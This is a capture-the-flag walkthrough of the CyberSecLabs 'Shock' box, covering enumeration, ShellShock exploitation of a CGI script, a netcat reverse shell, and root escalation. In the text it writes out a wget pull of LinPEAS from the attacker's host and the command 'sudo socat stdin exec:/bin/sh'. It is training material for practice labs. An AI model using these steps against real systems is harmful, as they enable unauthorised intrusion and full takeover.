---
layout: page
title: Shock - CyberSecLabs
permalink: /posts/ctf/cyberseclabs/shock.html
---

# Shock - CyberSecLabs
----

- OS: Linux
- Level: Easy
- Vulns Found: 2


First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.3`

![image](https://user-images.githubusercontent.com/50459517/102672581-cb602200-4156-11eb-8dc0-56c5dcf085d2.png)

We see we have a few ports open.  21, 22 and 80.  I normally like to check out port 80 first, do a scan for directories and check other ports while that's running.  Lets see what's on port 80.

![image](https://user-images.githubusercontent.com/50459517/102672611-e16de280-4156-11eb-8149-f8f67cb0bdd5.png)

After some manual enumeration of the webpages and source code, nothing seems to jump out at me.  So lets scan for some directories.  I like to use **dirsearch** for this, but any directory busting tool should work just fine.

`dirsearch -u http://172.31.1.3/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 400,500 -e php,txt,html -f -t 100`

While that is running, lets look at port 21 and see if we can anonymously log in.

![image](https://user-images.githubusercontent.com/50459517/102672633-f480b280-4156-11eb-91e2-4c65a38b7dd1.png)

Login seems to fail.. I also did some quick searches with google and searchsploit for known exploits on vsFTPd 3.0.3 but didn't find anything that jumped out at me.

![image](https://user-images.githubusercontent.com/50459517/102672677-12e6ae00-4157-11eb-92ca-19c9819f673b.png)

With our scan complete, I see a directory called **cgi-bin** that jumps out at me, this directory often stores various scripts that the Apache server can use the CGI interface to execute.  So I usually like to do a quick scan for `.cgi` scripts in this directory however if I get stuck I may search for other extensions such as `.py` or `.pl` as well.

`dirsearch -u http://172.31.1.3/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 400,500 -e cgi -f -t 100`

Right away we see a file called **test.cgi**.  Now if we do a quick search for "Apache cgi script exploits" we may find a few things, however the one that sticks out to me is called ShellShock.  This is because the name of the box is called Shock as well as the HTML Title is called "Steak House Shock".  So I believe this may be vulnerable to the ShellShock vulnerability.

Now ShellShock is a vulnerability in certain versions of Bash that takes advantage of the way bash handles environment variables.  You can trick bash into executing code that is being passed into the environment variable rather than just storing the data.  Here is a nice little screenshot from Symantec explaining this better.

![image](https://user-images.githubusercontent.com/50459517/102672758-5fca8480-4157-11eb-95fa-67fb546522eb.png)

Also I found a great PoC at this website explaining how it works and how to test for it.  Lets try this out.

[https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/#:~:text=Shellshock is a security bug causing Bash to,the server%2C also known as remote code execution](https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/#:~:text=Shellshock%20is%20a%20security%20bug%20causing%20Bash%20to,the%20server%2C%20also%20known%20as%20remote%20code%20execution)

I opened Burp Suite and sent **http://172.31.1.3/cgi-bin/test.cgi** to the Burp Proxy so I can mess around with the GET request.

![image](https://user-images.githubusercontent.com/50459517/102672823-8983ab80-4157-11eb-8a92-452dd49661ac.png)

Now we can send this to Repeater and see what our Response looks like.

![image](https://user-images.githubusercontent.com/50459517/102672853-9f916c00-4157-11eb-8718-7d0d33f64950.png)

Now like we saw in the article, lets modify the **Referer:** header in the Request (In this case we will need to add this header) and see if we get code execution.

![image](https://user-images.githubusercontent.com/50459517/102672873-b20ba580-4157-11eb-9fb7-bac5355f3e78.png)

Awesome!  We have code execution!  Lets get that shell now!

We will use just a basic bash one liner to send a request to out machine on port 1337.  We will start a netcat listener on our machine that will listen for the request.  Thus resulting in a reverse shell.

![image](https://user-images.githubusercontent.com/50459517/102672900-c6e83900-4157-11eb-819d-59b4a99f4941.png)

![image](https://user-images.githubusercontent.com/50459517/102672934-db2c3600-4157-11eb-8d2e-d5655d299e7d.png)

Now we have a shell as www-data.  After looking around we find a user named scott.  In his home directory we find **access.txt** which we have permissions to read.

![image](https://user-images.githubusercontent.com/50459517/102672947-e717f800-4157-11eb-89d5-aa3c19b5d8e5.png)

With that out of the way, I normally like to run some type of post-enumeration script like LinPEAS.  We can just host up the file with **python -m SimpleHTTPServer 80** on our machine and then **wget http://ip/linpeas.sh** onto the victim machine in a directory we have rwx permissions in (i.e. /tmp)

![image](https://user-images.githubusercontent.com/50459517/102673038-2d6d5700-4158-11eb-9eb9-a0523ab69804.png)

Now lets run the file and see what it finds for us.

![image](https://user-images.githubusercontent.com/50459517/102673060-3d853680-4158-11eb-86cb-a0038444b4a5.png)

Unfortunately I had some issues with the script stopping at Internet Access checks and forcing me to stop the script.  I troubleshooted this for a little bit before deciding to move on as I think it may have been something with the machine timing out during this check.

Anyways I decided to do a little manual enumeration before trying another script.  Luckily I found something first thing!  I ran **sudo -l** to list anything I may have permissions to run as a sudo user.

![image](https://user-images.githubusercontent.com/50459517/102673082-4d047f80-4158-11eb-9532-fff36f7a688d.png)

As you can see, we have permissions to run socat as root with no password.  Great!  Lets check GTFOBins to see if we can escalate our privileges.

[https://gtfobins.github.io/](https://gtfobins.github.io/)

Per GTFOBins, we see we can run **sudo socat stdin exec:/bin/sh** to escalate our privileges.  This works because we have permission to run the socat utility as root with no password needed.  The option **stdin**(Standard Input) uses a file descriptor of 0 and **exec:/bin/bash** means it will execute a bash terminal at the end of the pipe.  So if I understand it correctly, instead of using socat to connect to or listen in on a connection from another host, we are just passing the /bin/bash script into our terminal.  And since we are running this as root, we will open a terminal instance as root, thus resulting in use escalating our privileges.

![image](https://user-images.githubusercontent.com/50459517/102673108-686f8a80-4158-11eb-94d1-7fb4b2343874.png)

And that's it!  This was a fun little box that shows a pretty straight forward vulnerability in ShellShock as well as a common mis-configuration seen that can allow low level users to run certain programs/files as elevated users.
